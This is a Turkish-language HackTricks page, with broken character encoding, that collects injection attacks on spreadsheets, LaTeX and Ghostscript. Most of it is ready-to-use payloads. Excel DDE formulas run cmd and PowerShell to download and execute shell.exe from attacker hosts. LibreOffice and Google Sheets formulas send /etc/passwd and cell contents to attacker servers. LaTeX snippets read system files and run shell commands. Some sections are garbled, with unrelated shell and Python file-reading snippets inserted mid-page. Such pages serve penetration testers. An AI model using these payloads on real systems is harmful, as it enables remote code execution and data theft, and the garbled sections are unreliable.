# FormÃ¼l/CSV/DÃ¶kÃ¼man/LaTeX/GhostScript Enjeksiyonu

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En Ã¶nemli olan zayÄ±flÄ±klarÄ± bulun, bÃ¶ylece daha hÄ±zlÄ± dÃ¼zeltebilirsiniz. Intruder saldÄ±rÄ± yÃ¼zeyinizi takip eder, proaktif tehdit taramalarÄ± yapar, API'lerden web uygulamalarÄ±na ve bulut sistemlerine kadar tÃ¼m teknoloji yÄ±ÄŸÄ±nÄ±nÄ±zda sorunlarÄ± bulur. [**Ãœcretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugÃ¼n.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## FormÃ¼l Enjeksiyonu

### Bilgi

EÄŸer **girdiniz**, **CSV dosyalarÄ±**nda (veya muhtemelen **Excel** tarafÄ±ndan aÃ§Ä±lacak baÅŸka bir dosyada) **yansÄ±tÄ±lÄ±yorsa**, Excel sayfasÄ±nÄ± **aÃ§tÄ±ÄŸÄ±nda** veya kullanÄ±cÄ± **bazÄ± baÄŸlantÄ±lara tÄ±kladÄ±ÄŸÄ±nda** Ã§alÄ±ÅŸtÄ±rÄ±lacak Excel **formÃ¼lleri** ekleyebilirsiniz.

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde, Excel, kullanÄ±cÄ±nÄ±n kÃ¶tÃ¼ niyetli eylemlerden korunmak iÃ§in, Excel dÄ±ÅŸÄ±ndan bir ÅŸey yÃ¼klendiÄŸinde kullanÄ±cÄ±ya (birkaÃ§ kez) **uyarÄ±da bulunur**. Bu nedenle, son saldÄ±rÄ± yÃ¼kÃ¼ iÃ§in Ã¶zel bir Sosyal MÃ¼hendislik Ã§abasÄ± gereklidir.
{% endhint %}

### [Wordlist](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hyperlink

**AÅŸaÄŸÄ±daki Ã¶rnek, son excel tablosundan iÃ§eriÄŸi dÄ±ÅŸarÄ± Ã§Ä±karmak ve keyfi konumlara istekler yapmak iÃ§in Ã§ok kullanÄ±ÅŸlÄ±dÄ±r. Ancak, kullanÄ±cÄ±nÄ±n baÄŸlantÄ±ya tÄ±klamasÄ± (ve uyarÄ±larÄ± kabul etmesi) gerekmektedir.**

AÅŸaÄŸÄ±daki Ã¶rnek [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit) adresinden alÄ±nmÄ±ÅŸtÄ±r.

Bir Ã–ÄŸrenci KayÄ±t YÃ¶netim sistemindeki bir gÃ¼venlik aÃ§Ä±ÄŸÄ±, CSV enjeksiyon saldÄ±rÄ±sÄ±yla sÃ¶mÃ¼rÃ¼lÃ¼r. SaldÄ±rganÄ±n temel amacÄ±, Ã¶ÄŸretmenlerin Ã¶ÄŸrenci detaylarÄ±nÄ± yÃ¶netmek iÃ§in kullandÄ±ÄŸÄ± sistemi tehlikeye atmak. SaldÄ±rÄ± aÅŸaÄŸÄ±daki gibi gerÃ§ekleÅŸir:

1. **ZararlÄ± YÃ¼kÃ¼n Enjekte Edilmesi:**
- SaldÄ±rgan, Ã¶ÄŸrenci detay formunu gÃ¶nderirken, elektronik tablolarda yaygÄ±n olarak kullanÄ±lan bir formÃ¼lÃ¼ (Ã¶rneÄŸin, `=HYPERLINK("<zararlÄ±_baÄŸlantÄ±>","Buraya tÄ±klayÄ±n")`) dahil eder.
- Bu formÃ¼l, bir baÄŸlantÄ± oluÅŸturmak iÃ§in tasarlanmÄ±ÅŸtÄ±r, ancak saldÄ±rgan tarafÄ±ndan kontrol edilen zararlÄ± bir sunucuya iÅŸaret eder.

2. **Kompromize EdilmiÅŸ Verinin DÄ±ÅŸa AktarÄ±lmasÄ±:**
- Kompromis farkÄ±nda olmayan Ã¶ÄŸretmenler, verileri bir CSV dosyasÄ±na aktarmak iÃ§in uygulamanÄ±n iÅŸlevselliÄŸini kullanÄ±r.
- CSV dosyasÄ±, aÃ§Ä±ldÄ±ÄŸÄ±nda hala zararlÄ± yÃ¼k iÃ§erir. Bu yÃ¼k, elektronik tabloda tÄ±klanabilir bir baÄŸlantÄ± olarak gÃ¶rÃ¼nÃ¼r.

3. **SaldÄ±rÄ±nÄ±n Tetiklenmesi:**
- Bir Ã¶ÄŸretmen, Ã¶ÄŸrenci detaylarÄ±nÄ±n meÅŸru bir parÃ§asÄ± olduÄŸuna inanarak baÄŸlantÄ±ya tÄ±klar.
- TÄ±kladÄ±ktan sonra, hassas veriler (potansiyel olarak elektronik tablodan veya Ã¶ÄŸretmenin bilgisayarÄ±ndan ayrÄ±ntÄ±lar) saldÄ±rganÄ±n sunucusuna iletilir.

4. **Verilerin Kaydedilmesi:**
- SaldÄ±rganÄ±n sunucusu, Ã¶ÄŸretmenin bilgisayarÄ±ndan gÃ¶nderilen hassas verileri alÄ±r ve kaydeder.
- SaldÄ±rgan daha sonra bu verileri Ã§eÅŸitli kÃ¶tÃ¼ niyetli amaÃ§lar iÃ§in kullanabilir, Ã¶ÄŸrencilerin ve kurumun gizliliÄŸini ve gÃ¼venliÄŸini daha da tehlikeye atarak.

### RCE

**Daha fazla ayrÄ±ntÄ± iÃ§in [orijinal yayÄ±na](https://notsosecure.com/data-exfiltration-formula-injection-part1) bakÄ±n.**

Belirli yapÄ±landÄ±rmalarda veya eski sÃ¼rÃ¼mlerde, Excel'in Dynamic Data Exchange (DDE) adlÄ± bir Ã¶zelliÄŸi keyfi komutlarÄ± yÃ¼rÃ¼tmek iÃ§in sÃ¶mÃ¼rÃ¼lebilir. Bunun iÃ§in aÅŸaÄŸÄ±daki ayarlarÄ±n etkinleÅŸtirilmesi gerekmektedir:

- Dosya â†’ SeÃ§enekler â†’ GÃ¼ven Merkezi â†’ GÃ¼ven Merkezi AyarlarÄ± â†’ Harici Ä°Ã§erik'e gidin ve **Dynamic Data Exchange Server Launch**'Ä± etkinleÅŸtirin.

ZararlÄ± yÃ¼k iÃ§eren bir elektronik tablo aÃ§Ä±ldÄ±ÄŸÄ±nda (ve kullanÄ±cÄ± uyarÄ±larÄ± kabul ederse), zararlÄ± yÃ¼k yÃ¼rÃ¼tÃ¼lÃ¼r. Ã–rneÄŸin, hesap makinesi uygulamasÄ±nÄ± baÅŸlatmak iÃ§in zararlÄ± yÃ¼k ÅŸu ÅŸekilde olacaktÄ±r:
```markdown
`=cmd|' /C calc'!xxx`
```
Ek komutlar da Ã§alÄ±ÅŸtÄ±rÄ±labilir, Ã¶rneÄŸin PowerShell kullanarak bir dosya indirip Ã§alÄ±ÅŸtÄ±rmak:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LibreOffice Calc'ta Yerel Dosya Dahil Etme (LFI)

LibreOffice Calc, yerel dosyalarÄ± okumak ve veri sÄ±zdÄ±rmak iÃ§in kullanÄ±labilir. Ä°ÅŸte bazÄ± yÃ¶ntemler:

- Yerel `/etc/passwd` dosyasÄ±ndan ilk satÄ±rÄ± okuma: `='file:///etc/passwd'#$passwd.A1`
- Okunan verileri saldÄ±rgan tarafÄ±ndan kontrol edilen bir sunucuya sÄ±zdÄ±rma: `=WEBSERVICE(CONCATENATE("http://<saldÄ±rgan IP>:8080/",('file:///etc/passwd'#$passwd.A1)))`
- Birden fazla satÄ±rÄ± sÄ±zdÄ±rma: `=WEBSERVICE(CONCATENATE("http://<saldÄ±rgan IP>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
- DNS sÄ±zdÄ±rma (okunan verileri saldÄ±rgan tarafÄ±ndan kontrol edilen bir DNS sunucusuna DNS sorgularÄ± olarak gÃ¶nderme): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<saldÄ±rgan alan adÄ±>"))`

### Out-of-Band (OOB) Veri SÄ±zdÄ±rma iÃ§in Google Sheets

Google Sheets, OOB veri sÄ±zdÄ±rma iÃ§in istismar edilebilecek iÅŸlevler sunar:

- **CONCATENATE**: Dizeleri birleÅŸtirir - `=CONCATENATE(A2:E2)`
- **IMPORTXML**: YapÄ±landÄ±rÄ±lmÄ±ÅŸ veri tÃ¼rlerinden veri alÄ±r - `=IMPORTXML(CONCAT("http://<saldÄ±rgan IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
- **IMPORTFEED**: RSS veya ATOM beslemelerini alÄ±r - `=IMPORTFEED(CONCAT("http://<saldÄ±rgan IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
- **IMPORTHTML**: HTML tablolarÄ±ndan veya listelerinden veri alÄ±r - `=IMPORTHTML (CONCAT("http://<saldÄ±rgan IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
- **IMPORTRANGE**: BaÅŸka bir elektronik tablodan hÃ¼cre aralÄ±ÄŸÄ± alÄ±r - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
- **IMAGE**: Bir hÃ¼creye bir resim ekler - `=IMAGE("https://<saldÄ±rgan IP:Port>/images/srpr/logo3w.png")`


## LaTeX Enjeksiyonu

Genellikle internet Ã¼zerinde bulunan **LaTeX kodunu PDF'ye dÃ¶nÃ¼ÅŸtÃ¼ren sunucular** **`pdflatex`** kullanÄ±r.\
Bu program, komut yÃ¼rÃ¼tme iÅŸlemini (devre dÄ±ÅŸÄ± bÄ±rakmak) veya (etkinleÅŸtirmek) iÃ§in 3 ana Ã¶zelliÄŸi kullanÄ±r:

* **`--no-shell-escape`**: `\write18{command}` yapÄ±sÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakÄ±r, hatta texmf.cnf dosyasÄ±nda etkinleÅŸtirilmiÅŸ olsa bile.
* **`--shell-restricted`**: `--shell-escape` ile aynÄ±dÄ±r, ancak 'gÃ¼venli' bir dizi **Ã¶nceden tanÄ±mlanmÄ±ÅŸ** komutlarla **sÄ±nÄ±rlÄ±dÄ±r** (\*\*Ubuntu 16.04'te liste `/usr/share/texmf/web2c/texmf.cnf` dosyasÄ±nda bulunur).
* **`--shell-escape`**: `\write18{command}` yapÄ±sÄ±nÄ± etkinleÅŸtirir. Komut herhangi bir kabuk komutu olabilir. Bu yapÄ± normalde gÃ¼venlik nedenleriyle yasaklanmÄ±ÅŸtÄ±r.

Ancak, komutlarÄ± yÃ¼rÃ¼tmek iÃ§in baÅŸka yollar vardÄ±r, bu nedenle Uzaktan Komut YÃ¼rÃ¼tme'yi Ã¶nlemek iÃ§in `--shell-restricted` kullanmak Ã§ok Ã¶nemlidir.

### Dosya Okuma <a href="#read-file" id="read-file"></a>

Enjeksiyonu \[ veya $ gibi sarmalayÄ±cÄ±larla ayarlamak gerekebilir.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Tek satÄ±rlÄ±k dosya okuma

```bash
cat file.txt
```

Bu komut, `file.txt` adlÄ± dosyanÄ±n iÃ§eriÄŸini tek bir satÄ±rda okur ve terminale yazdÄ±rÄ±r.
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Ã‡ok satÄ±rlÄ± dosya okuma

Bir dosyanÄ±n birden Ã§ok satÄ±rÄ±nÄ± okumak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyin:

1. DosyayÄ± aÃ§Ä±n ve okuma modunda aÃ§Ä±k tutun.
2. DosyanÄ±n iÃ§eriÄŸini satÄ±r satÄ±r okuyun.
3. Her satÄ±rÄ± iÅŸleyin veya kullanÄ±n.

AÅŸaÄŸÄ±da Python dilinde bir Ã¶rnek bulunmaktadÄ±r:

```python
with open('dosya.txt', 'r') as dosya:
    satirlar = dosya.readlines()
    for satir in satirlar:
        # SatÄ±rÄ± iÅŸleyin veya kullanÄ±n
        print(satir)
```

Bu kod, "dosya.txt" adlÄ± dosyayÄ± okur ve her satÄ±rÄ± ekrana yazdÄ±rÄ±r. Ä°ÅŸlem yapmak istediÄŸiniz her satÄ±r iÃ§in uygun kodu ekleyebilirsiniz.
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Dosya yazma <a href="#dosya-yazma" id="dosya-yazma"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Komut yÃ¼rÃ¼tme <a href="#komut-yÃ¼rÃ¼tme" id="komut-yÃ¼rÃ¼tme"></a>

Komutun girdisi stdin'e yÃ¶nlendirilecek, bunu almak iÃ§in geÃ§ici bir dosya kullanÄ±n.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
EÄŸer herhangi bir LaTex hatasÄ± alÄ±rsanÄ±z, sonucu kÃ¶tÃ¼ karakterler olmadan elde etmek iÃ§in base64 kullanmayÄ± dÃ¼ÅŸÃ¼nÃ¼n.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

[@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130) tarafÄ±ndan yapÄ±lan bir paylaÅŸÄ±mdan alÄ±ntÄ±dÄ±r.
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript Enjeksiyonu

**[https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/) adresini kontrol edin.**

## Referanslar

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En Ã¶nemli olan zayÄ±flÄ±klarÄ± bulun, bÃ¶ylece daha hÄ±zlÄ± dÃ¼zeltebilirsiniz. Intruder saldÄ±rÄ± yÃ¼zeyinizi takip eder, proaktif tehdit taramalarÄ± yapar, API'lerden web uygulamalarÄ±na ve bulut sistemlerine kadar tÃ¼m teknoloji yÄ±ÄŸÄ±nÄ±nÄ±zda sorunlarÄ± bulur. [**Ãœcretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugÃ¼n.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin.**
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
